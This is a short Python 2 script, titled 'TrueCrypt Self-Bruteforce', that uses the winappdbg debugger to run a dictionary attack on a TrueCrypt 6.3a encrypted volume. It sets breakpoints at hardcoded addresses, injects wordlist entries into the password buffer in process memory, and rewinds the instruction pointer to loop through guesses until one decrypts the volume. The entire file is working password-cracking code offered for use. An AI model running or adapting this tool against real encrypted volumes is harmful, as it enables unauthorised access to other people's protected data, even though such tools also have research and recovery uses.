# TrueCrypt Self-Bruteforce v0.1
# Based in Truecrypt version 6.3a
# Programmed by Miguel Febres
# mfebres@q-protex.com
# http://www.q-protex.com

# Performance: 2 words per second (Core Duo 2.2GHZ), DeviceIoControl is slow 

from winappdbg import Debug
from time import strftime
import time

counter=0
word=""
words=[]
r_eax = 0
r_ecx = 0
r_edx = 0
ptrBuffer=0

WORD_SIZE = 20

def action_2( event ):
    global word
    global counter
    global debug
    global ptrBuffer
    global WORD_SIZE
    
    aThread = event.get_thread()
    aProcess = event.get_process()
    if aProcess.peek(ptrBuffer, 1) == '\x00':
        print 'Counter: ' + repr(counter) + ' - Correct: ' + word
        debug.dont_break_at(aProcess.get_pid() , 0x0043F93E)
    else:
        #if (counter%1000)==0:
        print 'Counter: ' + repr(counter) + ' - Incorrect: ' + word

        if counter< len(words):
            aProcess.poke(ptrBuffer, '\x00') #flag 1
            word=words[counter]
            word = word.replace("\n","")
            word = word[0:WORD_SIZE-1]
            #word = word.lower() #optional
            word = word.ljust(WORD_SIZE,"\0")
            aProcess.poke_uint(ptrBuffer + 0x218, WORD_SIZE)
            aProcess.poke(ptrBuffer + 0x21C, word)
            aThread.set_register("Eip", 0x0043F90F)
            aThread.set_register("Eax",r_eax)
            aThread.set_register("Ecx",r_ecx)
            aThread.set_register("Edx",r_edx)
            counter+=1
        else:
            aProcess.kill()


def action_1( event ):
    global debug
    global ptrBuffer
    aThread = event.get_thread()
    aProcess = event.get_process()
    ptrBuffer = aThread.get_register("Ecx")
    debug.dont_break_at(aProcess.get_pid() , 0x0043F929)


def action_0( event ):
    global debug
    aThread = event.get_thread()
    aProcess = event.get_process()
    r_eax = aThread.get_register("Eax")
    r_ecx = aThread.get_register("Ecx")
    r_edx = aThread.get_register("Edx")
    debug.dont_break_at(aProcess.get_pid() , 0x0043F90F)


words = open('dic.txt', "r").readlines() #lengthall
print "[+] Words Loaded:",len(words)

try:
    debug = Debug()
    # Start a new process for debugging
    p = debug.execv( ['TrueCrypt.exe', '/v', 'test.tc', '/lx', '/p', "".ljust(WORD_SIZE) ,'/q', '/s'])

    debug.break_at(p.get_pid() , 0x0043F90F, action_0) #save state
    debug.break_at(p.get_pid() , 0x0043F929, action_1) #save buffer addres
    debug.break_at(p.get_pid() , 0x0043F93E, action_2) #check result, restore state, change eip

    # Wait for the debugee to finish
    t1 = time.clock() 
    debug.loop()

finally:
    debug.stop()

print 'Finished in ' + repr(time.clock() - t1) + ' seconds!'
